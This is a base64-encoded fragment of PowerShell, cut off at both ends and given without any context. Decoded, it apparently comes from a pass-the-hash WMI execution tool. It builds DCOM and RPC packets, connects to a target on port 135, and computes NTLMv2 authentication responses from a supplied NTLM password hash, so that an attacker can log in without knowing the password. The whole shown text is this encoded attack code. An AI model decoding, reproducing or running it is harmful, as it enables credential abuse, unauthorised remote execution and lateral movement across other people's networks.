JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTY21SZXF1ZXN0SW5mb0NvbW1vbkhlYWRlciIsW0J5dGVbXV0oMHgwMSwweDEwLDB4MDgsMHgwMCwweGNjLDB4Y2MsMHhjYywweGNjKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NjbVJlcXVlc3RJbmZvUHJpdmF0ZUhlYWRlciIsW0J5dGVbXV0oMHgyMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NjbVJlcXVlc3RJbmZvTlVMTFB0ciIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTY21SZXF1ZXN0SW5mb1JlbW90ZVJlcXVlc3RQdHJSZWZlcmVudElEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMiwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NjbVJlcXVlc3RJbmZvUmVtb3RlUmVxdWVzdFB0clJlbW90ZVJlcXVlc3RDbGllbnRJbXBlcnNvbmF0aW9uTGV2ZWwiLFtCeXRlW11dKDB4MDIsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2NtUmVxdWVzdEluZm9SZW1vdGVSZXF1ZXN0UHRyUmVtb3RlUmVxdWVzdE51bVByb3RvY29sU2VxdWVuY2VzIixbQnl0ZVtdXSgweDAxLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2NtUmVxdWVzdEluZm9SZW1vdGVSZXF1ZXN0UHRyUmVtb3RlUmVxdWVzdFVua25vd24iLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTY21SZXF1ZXN0SW5mb1JlbW90ZVJlcXVlc3RQdHJSZW1vdGVSZXF1ZXN0UHJvdG9jb2xTZXFzQXJyYXlQdHJSZWZlcmVudElEIixbQnl0ZVtdXSgweDA0LDB4MDAsMHgwMiwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NjbVJlcXVlc3RJbmZvUmVtb3RlUmVxdWVzdFB0clJlbW90ZVJlcXVlc3RQcm90b2NvbFNlcXNBcnJheVB0ck1heENvdW50IixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NjbVJlcXVlc3RJbmZvUmVtb3RlUmVxdWVzdFB0clJlbW90ZVJlcXVlc3RQcm90b2NvbFNlcXNBcnJheVB0clByb3RvY29sU2VxIixbQnl0ZVtdXSgweDA3LDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2NtUmVxdWVzdEluZm9VbnVzZWRCdWZmZXIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZQ0KfQ0KDQpmdW5jdGlvbiBEYXRhTGVuZ3RoMg0Kew0KICAgIHBhcmFtIChbSW50XSRsZW5ndGhfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkNCg0KICAgICRzdHJpbmdfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkc3RyaW5nX2V4dHJhY3RfZGF0YVskbGVuZ3RoX3N0YXJ0Li4oJGxlbmd0aF9zdGFydCArIDEpXSwwKQ0KDQogICAgcmV0dXJuICRzdHJpbmdfbGVuZ3RoDQp9DQoNCmlmKCRoYXNoIC1saWtlICIqOioiKQ0Kew0KICAgICRoYXNoID0gJGhhc2guU3ViU3RyaW5nKCgkaGFzaC5JbmRleE9mKCI6IikgKyAxKSwzMikNCn0NCg0KaWYoJERvbWFpbikNCnsNCiAgICAkb3V0cHV0X3VzZXJuYW1lID0gJERvbWFpbiArICJcIiArICRVc2VybmFtZQ0KfQ0KZWxzZQ0Kew0KICAgICRvdXRwdXRfdXNlcm5hbWUgPSAkVXNlcm5hbWUNCn0NCg0KaWYoJFRhcmdldCAtZXEgJ2xvY2FsaG9zdCcpDQp7DQogICAgJFRhcmdldCA9ICIxMjcuMC4wLjEiDQp9DQoNCnRyeQ0Kew0KICAgICR0YXJnZXRfdHlwZSA9IFtJUEFkZHJlc3NdJFRhcmdldA0KICAgICR0YXJnZXRfc2hvcnQgPSAkdGFyZ2V0X2xvbmcgPSAkVGFyZ2V0DQp9DQpjYXRjaA0Kew0KICAgICR0YXJnZXRfbG9uZyA9ICRUYXJnZXQNCg0KICAgIGlmKCRUYXJnZXQgLWxpa2UgIiouKiIpDQogICAgew0KICAgICAgICAkdGFyZ2V0X3Nob3J0X2luZGV4ID0gJFRhcmdldC5JbmRleE9mKCIuIikNCiAgICAgICAgJHRhcmdldF9zaG9ydCA9ICRUYXJnZXQuU3Vic3RyaW5nKDAsJHRhcmdldF9zaG9ydF9pbmRleCkNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgJHRhcmdldF9zaG9ydCA9ICRUYXJnZXQNCiAgICB9DQoNCn0NCg0KJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHwgU2VsZWN0LU9iamVjdCAtZXhwYW5kIGlkDQokcHJvY2Vzc19JRCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcHJvY2Vzc19JRCkpDQokcHJvY2Vzc19JRCA9ICRwcm9jZXNzX0lEIC1yZXBsYWNlICItMDAtMDAiLCIiDQpbQnl0ZVtdXSRwcm9jZXNzX0lEX2J5dGVzID0gJHByb2Nlc3NfSUQuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KV3JpdGUtVmVyYm9zZSAiQ29ubmVjdGluZyB0byAkVGFyZ2V0YDoxMzUiDQokV01JX2NsaWVudF9pbml0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50DQokV01JX2NsaWVudF9pbml0LkNsaWVudC5SZWNlaXZlVGltZW91dCA9IDMwMDAwDQoNCnRyeQ0Kew0KICAgICRXTUlfY2xpZW50X2luaXQuQ29ubmVjdCgkVGFyZ2V0LCIxMzUiKQ0KfQ0KY2F0Y2gNCnsNCiAgICBXcml0ZS1PdXRwdXQgIiRUYXJnZXQgZGlkIG5vdCByZXNwb25kIg0KfQ0KDQppZigkV01JX2NsaWVudF9pbml0LkNvbm5lY3RlZCkNCnsNCiAgICAkV01JX2NsaWVudF9zdHJlYW1faW5pdCA9ICRXTUlfY2xpZW50X2luaXQuR2V0U3RyZWFtKCkNCiAgICAkV01JX2NsaWVudF9yZWNlaXZlID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDIwNDgNCiAgICAkUlBDX1VVSUQgPSAweGM0LDB4ZmUsMHhmYywweDk5LDB4NjAsMHg1MiwweDFiLDB4MTAsMHhiYiwweGNiLDB4MDAsMHhhYSwweDAwLDB4MjEsMHgzNCwweDdhDQogICAgJHBhY2tldF9SUEMgPSBHZXQtUGFja2V0UlBDQmluZCAyIDB4ZDAsMHgxNiAweDAyIDB4MDAsMHgwMCAkUlBDX1VVSUQgMHgwMCwweDAwDQogICAgJHBhY2tldF9SUENbIlJQQ0JpbmRfRnJhZ0xlbmd0aCJdID0gMHg3NCwweDAwICAgIA0KICAgICRSUEMgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQw0KICAgICRXTUlfY2xpZW50X3NlbmQgPSAkUlBDDQogICAgJFdNSV9jbGllbnRfc3RyZWFtX2luaXQuV3JpdGUoJFdNSV9jbGllbnRfc2VuZCwwLCRXTUlfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgJFdNSV9jbGllbnRfc3RyZWFtX2luaXQuRmx1c2goKSAgICANCiAgICAkV01JX2NsaWVudF9zdHJlYW1faW5pdC5SZWFkKCRXTUlfY2xpZW50X3JlY2VpdmUsMCwkV01JX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICRhc3NvY19ncm91cCA9ICRXTUlfY2xpZW50X3JlY2VpdmVbMjAuLjIzXQ0KICAgICRwYWNrZXRfUlBDID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMyAwIDAgMCAweDAyLDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDA1LDB4MDANCiAgICAkUlBDID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUEMNCiAgICAkV01JX2NsaWVudF9zZW5kID0gJFJQQw0KICAgICRXTUlfY2xpZW50X3N0cmVhbV9pbml0LldyaXRlKCRXTUlfY2xpZW50X3NlbmQsMCwkV01JX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICRXTUlfY2xpZW50X3N0cmVhbV9pbml0LkZsdXNoKCkgICAgDQogICAgJFdNSV9jbGllbnRfc3RyZWFtX2luaXQuUmVhZCgkV01JX2NsaWVudF9yZWNlaXZlLDAsJFdNSV9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAkV01JX2hvc3RuYW1lX3VuaWNvZGUgPSAkV01JX2NsaWVudF9yZWNlaXZlWzQyLi4kV01JX2NsaWVudF9yZWNlaXZlLkxlbmd0aF0NCiAgICAkV01JX2hvc3RuYW1lID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkV01JX2hvc3RuYW1lX3VuaWNvZGUpDQogICAgJFdNSV9ob3N0bmFtZV9pbmRleCA9ICRXTUlfaG9zdG5hbWUuSW5kZXhPZigiLTAwLTAwLTAwIikNCiAgICAkV01JX2hvc3RuYW1lID0gJFdNSV9ob3N0bmFtZS5TdWJTdHJpbmcoMCwkV01JX2hvc3RuYW1lX2luZGV4KQ0KICAgICRXTUlfaG9zdG5hbWUgPSAkV01JX2hvc3RuYW1lIC1yZXBsYWNlICItMDAiLCIiDQogICAgJFdNSV9ob3N0bmFtZSA9ICRXTUlfaG9zdG5hbWUuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KICAgICRXTUlfaG9zdG5hbWUgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRXTUlfaG9zdG5hbWUsMCwkV01JX2hvc3RuYW1lLkxlbmd0aCkNCg0KICAgIGlmKCR0YXJnZXRfc2hvcnQgLWNuZSAkV01JX2hvc3RuYW1lKQ0KICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV01JIHJlcG9ydHMgdGFyZ2V0IGhvc3RuYW1lIGFzICRXTUlfaG9zdG5hbWUiDQogICAgICAgICR0YXJnZXRfc2hvcnQgPSAkV01JX2hvc3RuYW1lDQogICAgfQ0KDQogICAgJFdNSV9jbGllbnRfaW5pdC5DbG9zZSgpDQogICAgJFdNSV9jbGllbnRfc3RyZWFtX2luaXQuQ2xvc2UoKQ0KICAgICRXTUlfY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50DQogICAgJFdNSV9jbGllbnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gMzAwMDANCg0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgJFdNSV9jbGllbnQuQ29ubmVjdCgkdGFyZ2V0X2xvbmcsIjEzNSIpDQogICAgfQ0KICAgIGNhdGNoDQogICAgew0KICAgICAgICBXcml0ZS1PdXRwdXQgIiR0YXJnZXRfbG9uZyBkaWQgbm90IHJlc3BvbmQiDQogICAgfQ0KDQogICAgaWYoJFdNSV9jbGllbnQuQ29ubmVjdGVkKQ0KICAgIHsNCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtID0gJFdNSV9jbGllbnQuR2V0U3RyZWFtKCkNCiAgICAgICAgJFJQQ19VVUlEID0gMHhhMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0Ng0KICAgICAgICAkcGFja2V0X1JQQyA9IEdldC1QYWNrZXRSUENCaW5kIDMgMHhkMCwweDE2IDB4MDEgMHgwMSwweDAwICRSUENfVVVJRCAweDAwLDB4MDANCiAgICAgICAgJHBhY2tldF9SUENbIlJQQ0JpbmRfRnJhZ0xlbmd0aCJdID0gMHg3OCwweDAwDQogICAgICAgICRwYWNrZXRfUlBDWyJSUENCaW5kX0F1dGhMZW5ndGgiXSA9IDB4MjgsMHgwMA0KICAgICAgICAkcGFja2V0X1JQQ1siUlBDQmluZF9OZWdvdGlhdGVGbGFncyJdID0gMHgwNywweDgyLDB4MDgsMHhhMg0KICAgICAgICAkUlBDID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUEMNCiAgICAgICAgJFdNSV9jbGllbnRfc2VuZCA9ICRSUEMNCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtLldyaXRlKCRXTUlfY2xpZW50X3NlbmQsMCwkV01JX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAkV01JX2NsaWVudF9zdHJlYW0uRmx1c2goKSAgICANCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtLlJlYWQoJFdNSV9jbGllbnRfcmVjZWl2ZSwwLCRXTUlfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICRhc3NvY19ncm91cCA9ICRXTUlfY2xpZW50X3JlY2VpdmVbMjAuLjIzXQ0KICAgICAgICAkV01JX05UTE1TU1AgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfY2xpZW50X3JlY2VpdmUpDQogICAgICAgICRXTUlfTlRMTVNTUCA9ICRXTUlfTlRMTVNTUCAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgJFdNSV9OVExNU1NQX2luZGV4ID0gJFdNSV9OVExNU1NQLkluZGV4T2YoIjRFNTQ0QzRENTM1MzUwMDAiKQ0KICAgICAgICAkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggPSAkV01JX05UTE1TU1BfaW5kZXggLyAyDQogICAgICAgICRXTUlfZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFdNSV9jbGllbnRfcmVjZWl2ZQ0KICAgICAgICAkV01JX3RhcmdldF9sZW5ndGggPSBEYXRhTGVuZ3RoMiAoJFdNSV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNDApICRXTUlfY2xpZW50X3JlY2VpdmUNCiAgICAgICAgJFdNSV9zZXNzaW9uX0lEID0gJFdNSV9jbGllbnRfcmVjZWl2ZVs0NC4uNTFdDQogICAgICAgICRXTUlfTlRMTV9jaGFsbGVuZ2UgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAyNCkuLigkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAzMSldDQogICAgICAgICRXTUlfdGFyZ2V0X2RldGFpbHMgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyA1NiArICRXTUlfZG9tYWluX2xlbmd0aCkuLigkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyA1NSArICRXTUlfZG9tYWluX2xlbmd0aCArICRXTUlfdGFyZ2V0X2xlbmd0aCldDQogICAgICAgICRXTUlfdGFyZ2V0X3RpbWVfYnl0ZXMgPSAkV01JX3RhcmdldF9kZXRhaWxzWygkV01JX3RhcmdldF9kZXRhaWxzLkxlbmd0aCAtIDEyKS4uKCRXTUlfdGFyZ2V0X2RldGFpbHMuTGVuZ3RoIC0gNSldDQogICAgICAgICROVExNX2hhc2hfYnl0ZXMgPSAoJntmb3IgKCRpID0gMDskaSAtbHQgJGhhc2guTGVuZ3RoOyRpICs9IDIpeyRoYXNoLlN1YlN0cmluZygkaSwyKX19KSAtam9pbiAiLSINCiAgICAgICAgJE5UTE1faGFzaF9ieXRlcyA9ICROVExNX2hhc2hfYnl0ZXMuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KICAgICAgICAkYXV0aF9ob3N0bmFtZSA9IChnZXQtY2hpbGRpdGVtIC1wYXRoIGVudjpjb21wdXRlcm5hbWUpLlZhbHVlDQogICAgICAgICRhdXRoX2hvc3RuYW1lX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkYXV0aF9ob3N0bmFtZSkNCiAgICAgICAgJGF1dGhfZG9tYWluID0gJERvbWFpbg0KICAgICAgICAkYXV0aF9kb21haW5fYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRhdXRoX2RvbWFpbikNCiAgICAgICAgJGF1dGhfdXNlcm5hbWVfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCR1c2VybmFtZSkNCiAgICAgICAgJGF1dGhfZG9tYWluX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCkNCiAgICAgICAgJGF1dGhfZG9tYWluX2xlbmd0aCA9ICRhdXRoX2RvbWFpbl9sZW5ndGhbMCwxXQ0KICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoKQ0KICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoID0gJGF1dGhfZG9tYWluX2xlbmd0aFswLDFdDQogICAgICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoKQ0KICAgICAgICAkYXV0aF91c2VybmFtZV9sZW5ndGggPSAkYXV0aF91c2VybmFtZV9sZW5ndGhbMCwxXQ0KICAgICAgICAkYXV0aF9ob3N0bmFtZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2hvc3RuYW1lX2J5dGVzLkxlbmd0aCkNCiAgICAgICAgJGF1dGhfaG9zdG5hbWVfbGVuZ3RoID0gJGF1dGhfaG9zdG5hbWVfbGVuZ3RoWzAsMV0NCiAgICAgICAgJGF1dGhfZG9tYWluX29mZnNldCA9IDB4NDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgJGF1dGhfdXNlcm5hbWVfb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgNjQpDQogICAgICAgICRhdXRoX2hvc3RuYW1lX29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArICRhdXRoX3VzZXJuYW1lX2J5dGVzLkxlbmd0aCArIDY0KQ0KICAgICAgICAkYXV0aF9MTV9vZmZzZXQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGggKyAkYXV0aF91c2VybmFtZV9ieXRlcy5MZW5ndGggKyAkYXV0aF9ob3N0bmFtZV9ieXRlcy5MZW5ndGggKyA2NCkNCiAgICAgICAgJGF1dGhfTlRMTV9vZmZzZXQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGggKyAkYXV0aF91c2VybmFtZV9ieXRlcy5MZW5ndGggKyAkYXV0aF9ob3N0bmFtZV9ieXRlcy5MZW5ndGggKyA4OCkNCiAgICAgICAgJEhNQUNfTUQ1ID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkhNQUNNRDUNCiAgICAgICAgJEhNQUNfTUQ1LmtleSA9ICROVExNX2hhc2hfYnl0ZXMNCiAgICAgICAgJHVzZXJuYW1lX2FuZF90YXJnZXQgPSAkdXNlcm5hbWUuVG9VcHBlcigpDQogICAgICAgICR1c2VybmFtZV9hbmRfdGFyZ2V0X2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkdXNlcm5hbWVfYW5kX3RhcmdldCkNCiAgICAgICAgJHVzZXJuYW1lX2FuZF90YXJnZXRfYnl0ZXMgKz0gJGF1dGhfZG9tYWluX2J5dGVzDQogICAgICAgICROVExNdjJfaGFzaCA9ICRITUFDX01ENS5Db21wdXRlSGFzaCgkdXNlcm5hbWVfYW5kX3RhcmdldF9ieXRlcykNCiAgICAgICAgJGNsaWVudF9jaGFsbGVuZ2UgPSBbU3RyaW5nXSgxLi44IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pDQogICAgICAgICRjbGllbnRfY2hhbGxlbmdlX2J5dGVzID0gJGNsaWVudF9jaGFsbGVuZ2UuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KDQogICAgICAgICRzZWN1cml0eV9ibG9iX2J5dGVzID0gMHgwMSwweDAxLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfdGFyZ2V0X3RpbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xpZW50X2NoYWxsZW5nZV9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3RhcmdldF9kZXRhaWxzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMA0KDQogICAgICAgICRzZXJ2ZXJfY2hhbGxlbmdlX2FuZF9zZWN1cml0eV9ibG9iX2J5dGVzID0gJFdNSV9OVExNX2NoYWxsZW5nZSArICRzZWN1cml0eV9ibG9iX2J5dGVzDQogICAgICAgICRITUFDX01ENS5rZXkgPSAkTlRMTXYyX2hhc2gNCiAgICAgICAgJE5UTE12Ml9yZXNwb25zZSA9ICRITUFDX01ENS5Db21wdXRlSGFzaCgkc2VydmVyX2NoYWxsZW5nZV9hbmRfc2VjdXJpdHlfYmxvYl9ieXRlcykNCiAgICAgICAgJHNlc3Npb25fYmFzZV9rZXkgPSAkSE1BQ19NRDUuQ29tcHV0ZUhhc2goJE5UTE12Ml9yZXNwb25zZSkNCiAgICAgICAgJE5UTE12Ml9yZXNwb25zZSA9ICROVExNdjJfcmVzcG9uc2UgKyAkc2VjdXJpdHlfYmxvYl9ieXRlcw0KICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJE5UTE12Ml9yZXNwb25zZS5MZW5ndGgpDQogICAgICAgICROVExNdjJfcmVzcG9uc2VfbGVuZ3RoID0gJE5UTE12Ml9yZXNwb25zZV9sZW5ndGhbMCwxXQ0KICAgICAgICAkV01JX3Nlc3Npb25fa2V5X29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArICRhdXRoX3VzZXJuYW1lX2J5dGVzLkxlbmd0aCArICRhdXRoX2hvc3RuYW1lX2J5dGVzLkxlbmd0aCArICROVExNdjJfcmVzcG9uc2UuTGVuZ3RoICsgODgpDQogICAgICAgICRXTUlfc2Vzc2lvbl9rZXlfbGVuZ3RoID0gMHgwMCwweDAwDQogICAgICAgICRXTUlfbmVnb3RpYXRlX2ZsYWdzID0gMHgxNSwweDgyLDB4ODgsMHhhMg0KDQogICAgICAgICROVExNU1NQX3Jlc3BvbnNlID0gMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX0xNX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNdjJfcmVzcG9uc2VfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE12Ml9yZXNwb25zZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9OVExNX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2RvbWFpbl9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfZG9tYWluX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX29mZnNldCArDQogICAgICAgICA